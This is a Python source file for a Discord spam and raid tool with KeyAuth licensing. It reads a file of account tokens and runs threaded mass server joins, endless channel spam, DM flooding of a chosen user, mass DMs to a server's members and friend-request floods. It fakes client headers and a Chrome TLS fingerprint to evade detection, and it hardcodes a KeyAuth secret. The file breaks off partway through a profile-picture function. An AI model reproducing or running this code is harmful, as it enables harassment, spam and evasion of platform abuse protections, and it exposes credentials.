from pystyle import Colors, Colorate, Box, Center, Write, System
import undetected_chromedriver as uc
from os import urandom as randbytes
from base64 import b64encode
from socket import *
import json, re
import json as jsond
import base64
import os, cv2
import random,string
import httpx
import tls_client, requests
import threading
import websocket
import platform
import subprocess
import binascii
from Cryptodome.Cipher import AES
from Cryptodome.Hash import SHA256
from Cryptodome.Util.Padding import pad, unpad
import win32security
import time
import hashlib
from uuid import uuid4
import sys
try:  # Connection check
    s = requests.Session()  # Session
    s.get('https://google.com')
except requests.exceptions.RequestException as e:
    print(e)
    time.sleep(3)
    os._exit(1)


class api:

    name = ownerid = secret = version = hash_to_check = ""

    def __init__(self, name, ownerid, secret, version, hash_to_check):
        self.name = name

        self.ownerid = ownerid

        self.secret = secret

        self.version = version
        self.hash_to_check = hash_to_check
        self.init()

    sessionid = enckey = ""
    initialized = False

    def init(self):

        if self.sessionid != "":
            print("You've already initialized!")
            time.sleep(3)
            os._exit(1)
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        self.enckey = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("init".encode()),
            "ver": encryption.encrypt(self.version, self.secret, init_iv),
            "hash": self.hash_to_check,
            "enckey": encryption.encrypt(self.enckey, self.secret, init_iv),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        if response == "KeyAuth_Invalid":
            print("The application doesn't exist")
            time.sleep(3)
            os._exit(1)

        response = encryption.decrypt(response, self.secret, init_iv)
        json = jsond.loads(response)

        if json["message"] == "invalidver":
            if json["download"] != "":
                print("New Version Available")
                download_link = json["download"]
                os.system(f"start {download_link}")
                time.sleep(3)
                os._exit(1)
            else:
                print("Invalid Version, Contact owner to add download link to latest app version")
                time.sleep(3)
                os._exit(1)

        if not json["success"]:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

        self.sessionid = json["sessionid"]
        self.initialized = True
        self.__load_app_data(json["appinfo"])

    def register(self, user, password, license, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("register".encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "pass": encryption.encrypt(password, self.enckey, init_iv),
            "key": encryption.encrypt(license, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            print("successfully registered")
            self.__load_user_data(json["info"])
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def upgrade(self, user, license):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("upgrade".encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "key": encryption.encrypt(license, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            print("Successfully upgraded user")
            print("Please restart program and login")
            time.sleep(3)
            os._exit(1)
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def login(self, user, password, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("login".encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "pass": encryption.encrypt(password, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            self.__load_user_data(json["info"])
            print("Successfully logged in")
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def license(self, key, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("license".encode()),
            "key": encryption.encrypt(key, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            self.__load_user_data(json["info"])
            print("Successfully logged in with license")
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def var(self, name):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("var".encode()),
            "varid": encryption.encrypt(name, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            return json["message"]
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def getvar(self, var_name):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("getvar".encode()),
            "var": encryption.encrypt(var_name, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return json["response"]
        else:
            print(f"NOTE: This is commonly misunderstood. This is for user variables, not the normal variables.\nUse keyauthapp.var(\"{var_name}\") for normal variables");
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def setvar(self, var_name, var_data):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify("setvar".encode()),
            "var": encryption.encrypt(var_name, self.enckey, init_iv),
            "data": encryption.encrypt(var_data, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def ban(self):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify("ban".encode()),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def file(self, fileid):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("file".encode()),
            "fileid": encryption.encrypt(fileid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if not json["success"]:
            print(json["message"])
            time.sleep(3)
            os._exit(1)
        return binascii.unhexlify(json["contents"])

    def webhook(self, webid, param, body = "", conttype = ""):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("webhook".encode()),
            "webid": encryption.encrypt(webid, self.enckey, init_iv),
            "params": encryption.encrypt(param, self.enckey, init_iv),
            "body": encryption.encrypt(body, self.enckey, init_iv),
            "conttype": encryption.encrypt(conttype, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return json["message"]
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def check(self):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify("check".encode()),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            return True
        else:
            return False

    def checkblacklist(self):
        self.checkinit()
        hwid = others.get_hwid()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify("checkblacklist".encode()),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            return True
        else:
            return False

    def log(self, message):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("log".encode()),
            "pcuser": encryption.encrypt(os.getenv('username'), self.enckey, init_iv),
            "message": encryption.encrypt(message, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        self.__do_request(post_data)

    def fetchOnline(self):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("fetchOnline".encode()),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            if len(json["users"]) == 0:
                return None  # THIS IS ISSUE ON KEYAUTH SERVER SIDE 6.8.2022, so it will return none if it is not an array.
            else:
                return json["users"]
        else:
            return None

    def chatGet(self, channel):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("chatget".encode()),
            "channel": encryption.encrypt(channel, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            return json["messages"]
        else:
            return None

    def chatSend(self, message, channel):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("chatsend".encode()),
            "message": encryption.encrypt(message, self.enckey, init_iv),
            "channel": encryption.encrypt(channel, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            return False

    def checkinit(self):
        if not self.initialized:
            print("Initialize first, in order to use the functions")
            time.sleep(3)
            os._exit(1)

    def changeUsername(self, username):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify("changeUsername".encode()),
            "newUsername": username,
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            print("Successfully changed username")
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)        
            
    def __do_request(self, post_data):
        try:
            rq_out = s.post(
                "https://keyauth.win/api/1.0/", data=post_data, timeout=30
            )
            return rq_out.text
        except requests.exceptions.Timeout:
            print("Request timed out")

    class application_data_class:
        numUsers = numKeys = app_ver = customer_panel = onlineUsers = ""

    class user_data_class:
        username = ip = hwid = expires = createdate = lastlogin = subscription = subscriptions = ""

    user_data = user_data_class()
    app_data = application_data_class()

    def __load_app_data(self, data):
        self.app_data.numUsers = data["numUsers"]
        self.app_data.numKeys = data["numKeys"]
        self.app_data.app_ver = data["version"]
        self.app_data.customer_panel = data["customerPanelLink"]
        self.app_data.onlineUsers = data["numOnlineUsers"]

    def __load_user_data(self, data):
        self.user_data.username = data["username"]
        self.user_data.ip = data["ip"]
        self.user_data.hwid = data["hwid"] or "N/A"
        self.user_data.expires = data["subscriptions"][0]["expiry"]
        self.user_data.createdate = data["createdate"]
        self.user_data.lastlogin = data["lastlogin"]
        self.user_data.subscription = data["subscriptions"][0]["subscription"]
        self.user_data.subscriptions = data["subscriptions"]


class others:
    @staticmethod
    def get_hwid():
        if platform.system() == "Linux":
            with open("/etc/machine-id") as f:
                hwid = f.read()
                return hwid
        elif platform.system() == 'Windows':
            winuser = os.getlogin()
            sid = win32security.LookupAccountName(None, winuser)[0]  # You can also use WMIC (better than SID, some users had problems with WMIC)
            hwid = win32security.ConvertSidToStringSid(sid)
            return hwid
        elif platform.system() == 'Darwin':
            output = subprocess.Popen("ioreg -l | grep IOPlatformSerialNumber", stdout=subprocess.PIPE, shell=True).communicate()[0]
            serial = output.decode().split('=', 1)[1].replace(' ', '')
            hwid = serial[1:-2]
            return hwid



class encryption:
    @staticmethod
    def encrypt_string(plain_text, key, iv):
        plain_text = pad(plain_text, 16)

        aes_instance = AES.new(key, AES.MODE_CBC, iv)

        raw_out = aes_instance.encrypt(plain_text)

        return binascii.hexlify(raw_out)

    @staticmethod
    def decrypt_string(cipher_text, key, iv):
        cipher_text = binascii.unhexlify(cipher_text)

        aes_instance = AES.new(key, AES.MODE_CBC, iv)

        cipher_text = aes_instance.decrypt(cipher_text)

        return unpad(cipher_text, 16)

    @staticmethod
    def encrypt(message, enc_key, iv):
        try:
            _key = SHA256.new(enc_key.encode()).hexdigest()[:32]

            _iv = SHA256.new(iv.encode()).hexdigest()[:16]

            return encryption.encrypt_string(message.encode(), _key.encode(), _iv.encode()).decode()
        except:
            print("Encryption error. Make sure your app details are correct, see response below")
            print("Response: " + message)
            time.sleep(3)
            os._exit(1)

    @staticmethod
    def decrypt(message, enc_key, iv):
        try:
            _key = SHA256.new(enc_key.encode()).hexdigest()[:32]

            _iv = SHA256.new(iv.encode()).hexdigest()[:16]

            return encryption.decrypt_string(message.encode(), _key.encode(), _iv.encode()).decode()
        except:
            print("Encryption error. Make sure your app details are correct, see response below")
            print("Response: " + message)
            time.sleep(3)
            os._exit(1)
tokens = open('assets/tokens.txt', 'r').read().splitlines()
def getchecksum():
    md5_hash = hashlib.md5()
    file = open(''.join(sys.argv), "rb")
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest
keyauthapp = api(
    name = "Esocarium",
    ownerid = "oTGdQhGRqL",
    secret = "62979872dcfa7e274f07d75625d3281ce7cc8cd5222397718d18db591ef2b111",
    version = "1.0",
    hash_to_check=getchecksum()
)
class Gateway:
    def __init__(self):
        self.ws = websocket.WebSocket()
    def __connect_ws(self):
        self.ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
    def __identify_ws(self, token):
        payload = {
            "op": 2,
            "d": {
                "token": token,
                "properties": {
                    "$os": sys.platform,
                    "$browser": "",
                    "$device": f"{sys.platform} Device"
                },
            },
            "s": None,
            "t": None
        }
        self.ws.send(json.dumps(payload))
    def close_ws(self):
        self.ws.close()
    def get_session_id(self):
      for i in range(5):
        try:recv = self.ws.recv();sessionid = json.loads(recv)['d']['session_id'];return sessionid
        except:pass
      return 
    def return_ws(self):return self.ws
    def run_gateway(self, token):
        self.__connect_ws()
        self.__identify_ws(token)
class Session:
    def __init__(self):
        self.ja3 = '771,4866-4867-4865-49196-49200-49195-49199-52393-52392-159-158-52394-49327-49325-49326-49324-49188-49192-49187-49191-49162-49172-49161-49171-49315-49311-49314-49310-107-103-57-51-157-156-49313-49309-49312-49308-61-60-53-47-255,0-11-10-35-16-22-23-49-13-43-45-51-21,29-23-30-25-24,0-1-2';self.identifier = 'chrome_106'
        self._session = tls_client.Session(            
            client_identifier=self.identifier,
            random_tls_extension_order=True,
            ja3_string=self.ja3)
    def session(self):return self._session
class DiscordTools:
  def __init__(self):
    self.client_build_num = self.__client_build_num()
    session = Session()
    self.useragent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9013 Chrome/108.0.5359.215 Electron/22.3.2 Safari/537.36'
    self.session = session.session()
    self.__cookies()
  def __headers(self, token):
    return {
      'authority'             : 'discord.com',
      'accept'                : '*/*',
      'accept-language'       : 'it,it-IT;q=0.9',
      'authorization'         : token,
      'content-type'          : 'application/json',
      'origin'                : 'https://discord.com',
      'referer'               : 'https://discord.com',
      'sec-ch-ua'             : '"Not?A_Brand";v="8", "Chromium";v="108"',
      'sec-ch-ua-mobile'      : '?0',
      'sec-ch-ua-platform'    : '"Windows"',
      'sec-fetch-dest'        : 'empty',
      'sec-fetch-mode'        : 'cors',
      'sec-fetch-site'        : 'same-origin',
      'user-agent'            : self.useragent,
      'x-debug-options'       : 'bugReporterEnabled',
      'x-discord-locale'      : 'en-GB',
      'x-super-properties'    : self.__build_super_prop(),
    }
  def __cookies(self):
        self.url = 'https://discord.com'
        r = self.session.get(self.url)
        cs = {};c = r.cookies
        for ck in c:cs[ck.name] = ck.value
        self.cookies = cs
  def __build_super_prop(self):
        webapp_properties = {
            "os"                    :"Windows",
            "browser"               :"Discord Client",
            "release_channel"       :"stable",
            "client_version"        :"1.0.9012",
            "os_version"            :"10.0.19044",
            "os_arch"               :"x64",
            "system_locale"         :"en-GB",
            "client_build_number"   :self.client_build_num,
            "native_build_number"   :32020,
            "client_event_source"   :None,
            "design_id"             :0
        }
        return b64encode(json.dumps(webapp_properties, separators=(',', ':')).encode()).decode()
  def __build_context_prop(self, location :str = "Join Guild",location_guild_id :str = "1090282970474106920",location_channel_id :str = "1090289026533163018",location_channel_type :int = 0,):
        webapp_properties = {"location":location,"location_guild_id":location_guild_id,"location_channel_id":location_channel_id,"location_channel_type":location_channel_type}
        return b64encode(json.dumps(webapp_properties, separators=(',', ':')).encode()).decode()
  def __client_build_num(self):
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0','Accept': '*/*','Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate, br','Alt-Used': 'discord.com','Connection': 'keep-alive','Referer': 'https://discord.com/','Sec-Fetch-Dest': 'script','Sec-Fetch-Mode': 'no-cors','Sec-Fetch-Site': 'same-origin','Pragma': 'no-cache','Cache-Control': 'no-cache','TE': 'trailers',}
        try:
            html = httpx.get(f"https://discord.com/app?_={(time.time() * 1000)}", headers=headers).text;last_index = html.rfind('/assets/')
            closing_quote_index = html.find('"', last_index);prefetched_script = html[last_index:closing_quote_index]
            response = httpx.get(f'https://discord.com{prefetched_script}', headers=headers).text;buildnum = response.split("buildNumber:\"")[1].split("\"")[0]
            print(Colorate.Horizontal(Colors.green_to_white, 'Discord build number retrived : '+str(buildnum), 1))
            return buildnum
        except:
            print(Colorate.Horizontal(Colors.red_to_white, 'Could not retrieve discord build number.', 1))
            return 185832
  def __fetch_invite(self, invite, headers):
        res = self.session.get('https://discord.com/api/v9/invites/{0}?inputValue={0}&with_counts=true&with_expiration=true'.format(invite),headers=headers,cookies=self.cookies)
        if res.status_code == 200:return res.json()
        else:return
  def __generate_nonce(self, channelid):
        nonce_generated = []
        z = str(channelid)[:len(str(channelid))-5]
        last = str(channelid)[len(str(channelid))-5:]
        for word_last in last:
            x = str(int(word_last) ^ random.randint(500, 1000))[1]
            nonce_generated.append(x)
        z += "".join(nonce_generated)
        return z
  def Joiner(self):
    def __join(token, invite):
      headers = self.__headers(token)
      gateway = Gateway()
      gateway.run_gateway(token)
      sessionid = gateway.get_session_id()
      fetched_invite = self.__fetch_invite(invite, headers)
      try:headers['x-context-properties'] = self.__build_context_prop(location_guild_id=fetched_invite['guild']['id'],location_channel_id=fetched_invite['channel']['id'],location_channel_type=fetched_invite['channel']['type'])
      except:headers['x-context-properties'] = self.__build_context_prop()
      res = self.session.post('https://discord.com/api/v9/invites/{}'.format(invite), json={'session_id': sessionid},headers=headers,cookies=self.cookies)
      if res.status_code in [200,204]:print(Colorate.Horizontal(Colors.green_to_white, 'Successfully Joined In "{0}" : {1}'.format(invite,token), 1))
      elif 'captcha' in res.text:print(Colorate.Horizontal(Colors.red_to_white, 'Failed To Join In "{0}" (Captcha detected) : {1}'.format(invite,token), 1))
      else:print(Colorate.Horizontal(Colors.red_to_white, 'Failed To Join In {0} : {1}'.format(invite,token), 1))
      gateway.close_ws()
    invite = Write.Input('Server invite code > ', Colors.red_to_yellow, 0.025)
    for token in tokens:threading.Thread(target=__join, args=(token, invite)).start()
    input()
  def Leaver(self):
    def __left(guildid, token):
      headers = self.__headers(token)
      res = self.session.delete('https://discord.com/api/v9/users/@me/guilds/{}'.format(guildid), json={'lurking': False}, headers=headers,cookies=self.cookies)
      if res.status_code in [200,204]:print(Colorate.Horizontal(Colors.green_to_white, '{0} Successfully Left : {1}'.format(guildid, token), 1))
      else:print(Colorate.Horizontal(Colors.red_to_white, 'Failed To Left {0} : {1}'.format(guildid, token), 1))
    guildid = Write.Input('Server ID > ', Colors.red_to_yellow, 0.025)
    for token in tokens:threading.Thread(target=__left, args=(guildid, token)).start()
    input()
  def Spammer(self):
    message = Write.Input('Message > ', Colors.red_to_yellow, 0.025)
    channelid = Write.Input('Channel ID > ', Colors.red_to_yellow, 0.025)
    def __send_msgs(token, message):
      headers = self.__headers(token)
      payload = {"content": message,"flags": 0,"tts": False}
      while True:
        payload['nonce'] = self.__generate_nonce(channelid)
        res=self.session.post('https://discord.com/api/v9/channels/{}/messages'.format(channelid),headers=headers,cookies=self.cookies,json=payload)
        if res.status_code in [200,204]:print(Colorate.Horizontal(Colors.green_to_white, 'Message Successfully Sent In {0} : {1}'.format(channelid,token),1))
        elif res.status_code == 429:print(Colorate.Horizontal(Colors.red_to_yellow, 'Rate Limited, Sleeping For {0} Seconds : {1}'.format(str(res.json()['retry_after']+5),token), 1));time.sleep(res.json()['retry_after']+5)
        else:print(Colorate.Horizontal(Colors.red_to_white, 'Failed to Send Message In {0} : {1} {2}'.format(channelid,token,res.text),1))
    for token in tokens:
        headers = self.__headers(token);payload = {"content": message,"flags": 0,"tts": False};payload['nonce'] = self.__generate_nonce(channelid)
        res=self.session.post('https://discord.com/api/v9/channels/{}/messages'.format(channelid),headers=headers,cookies=self.cookies,json=payload)
        if 'Missing Access' in res.text or 'Unauthorized' in res.text:pass
        else:threading.Thread(target=__send_msgs, args=(token, message)).start()
  def TokenChecker(self):
    def __check(token,_):
      headers = self.__headers(token)
      res = self.session.get("https://discord.com/api/v9/users/@me/guilds",headers=headers, cookies=self.cookies)
      if res.status_code in [200, 204]:print(Colorate.Horizontal(Colors.green_to_white, 'Valid : {}'.format(token),1))
      elif res.status_code == 403:print(Colorate.Horizontal(Colors.red_to_white, 'Locked : {}'.format(token),1))
      else:print(Colorate.Horizontal(Colors.red_to_white, 'Invalid : {}'.format(token),1))
    for token in tokens:threading.Thread(target=__check, args=(token, True)).start()
    input()
  def __get_channelid_user(self, userid, headers):
      res = self.session.post('https://discord.com/api/v9/users/@me/channels', headers=headers, data=json.dumps({"recipients":[userid]}), cookies=self.cookies).json()
      return res
  def __fetch_members(self, channelid, headers):
    try:return [channel['author']['id'] for channel in json.loads(self.session.get('https://discord.com/api/v9/channels/{}/messages'.format(channelid), headers=headers).text)]
    except:pass
  def DMSpammer(self):
    message = Write.Input('Message > ', Colors.red_to_yellow, 0.025)
    messagescount = int(Write.Input('Messages Count > ', Colors.red_to_yellow, 0.025))
    userid = Write.Input('User ID > ', Colors.red_to_yellow, 0.025)
    def __send_msg(token, message):
      try:
        headers = self.__headers(token)
        userdata = self.__get_channelid_user(userid, headers)
        channelid = userdata['id']
        username = userdata['recipients'][0]['username']
        payload = {"content": message,"flags": 0,"tts": False}
        payload['nonce'] = self.__generate_nonce(channelid)
        res=self.session.post('https://discord.com/api/v9/channels/{}/messages'.format(channelid),headers=headers,cookies=self.cookies,json=payload)
        if res.status_code in [200,204]:print(Colorate.Horizontal(Colors.green_to_white, 'Message Successfully Sent To {0} : {1}'.format(username,token),1))
        elif res.status_code == 429:print(Colorate.Horizontal(Colors.red_to_yellow, 'Rate Limited, Sleeping For {0} Seconds : {1}'.format(str(res.json()['retry_after']+1),token), 1));time.sleep(res.json()['retry_after']+1)
        else:print(Colorate.Horizontal(Colors.red_to_white, 'Failed to Send Message To {0} : {1}'.format(channelid,token),1))
      except:
         pass
    for token in tokens:
       for i in range(messagescount):threading.Thread(target=__send_msg, args=(token, message)).start()
    input()
  def ServerMassDM(self):
    users_ = []
    message = Write.Input('Message > ', Colors.red_to_yellow, 0.025)
    channelid_ = Write.Input('Channel ID > ', Colors.red_to_yellow, 0.025)
    def __send_msg(token, message):
      headers = self.__headers(token)
      userids = self.__fetch_members(channelid_, headers)
      for userid in userids:
         if userid not in users_:users_.append(userid)
      def send_msg(userid, _):
        try:
            userdata = self.__get_channelid_user(userid, headers)
            channelid = userdata['id']
            username = userdata['recipients'][0]['username']
            payload = {"content": message,"flags": 0,"tts": False}
            payload['nonce'] = self.__generate_nonce(channelid)
            res=self.session.post('https://discord.com/api/v9/channels/{}/messages'.format(channelid),headers=headers,cookies=self.cookies,json=payload)
            if res.status_code in [200,204]:print(Colorate.Horizontal(Colors.green_to_white, 'Message Successfully Sent To {0} : {1}'.format(username,token),1))
            elif res.status_code == 429:print(Colorate.Horizontal(Colors.red_to_yellow, 'Rate Limited, Sleeping For {0} Seconds : {1}'.format(str(res.json()['retry_after']+1),token), 1));time.sleep(res.json()['retry_after']+1)
            else:print(Colorate.Horizontal(Colors.red_to_white, 'Failed to Send Message To {0} : {1}'.format(channelid,token),1))
        except:
          pass
      for userid in users_:threading.Thread(target=send_msg, args=(userid, True)).start()
    for token in tokens:threading.Thread(target=__send_msg, args=(token, message)).start()
    input()
  def FriendSender(self):
    userid = Write.Input('User ID > ', Colors.red_to_yellow, 0.025)
    def _send_friendship(token,_):
       gateway = Gateway()
       gateway.run_gateway(token)
       headers = self.__headers(token)
       headers['x-context-properties'] = 'eyJsb2NhdGlvbiI6IkNvbnRleHRNZW51In0='
       try:
          res=self.session.put('https://discord.com/api/v9/users/@me/relationships/{}'.format(userid), headers=headers, json={},cookies=self.cookies)
          if res.status_code in [200,204]:print(Colorate.Horizontal(Colors.green_to_white, 'Friendship Successfully Sent To {0} : {1}'.format(userid,token),1))
          else:print(Colorate.Horizontal(Colors.red_to_white, 'Failed to Send Friendship : {}, {}'.format(token),1))
       except:
          pass
       gateway.close_ws()
    for token in tokens:threading.Thread(target=_send_friendship, args=(token, True)).start()
    input()
  def HypesquadJoiner(self):
    def _join_hypesquad(token,house_id):
       headers = self.__headers(token)
       try:
          res=self.session.post('https://discord.com/api/v9/hypesquad/online', headers=headers, json={"house_id": house_id},cookies=self.cookies)
          if res.status_code in [200,204]:print(Colorate.Horizontal(Colors.green_to_white, 'Hypesquad Successfully Joined : {}'.format(token),1))
          else:print(Colorate.Horizontal(Colors.red_to_white, 'Failed to Join Hypesquad : {}'.format(token),1))
       except:
          pass
    for token in tokens:threading.Thread(target= _join_hypesquad, args=(token, random.choice([1,2,3]))).start()
    input()
  def TokenOnliner(self):
    def _online(token,_):
      gateway = Gateway()
      gateway.run_gateway(token)
    for token in tokens:threading.Thread(target= _online, args=(token, True)).start()
  def PFPChanger(self):
    img_url = Write.Input('Image URL > ', Colors.red_to_yellow, 0.025)
    r = requests.get(img_url, stream=True)
    filename = ''.join(random.choice(string.ascii_lowercase)for i in range(5))+'.jpg'
    with open(os.path.join(filename), 'wb') as fd:fd.write(r.content)
    b64image=base64.b64encode(cv2.imencode('.jpg', cv2.imread(filename))[1]).decode('utf-8')
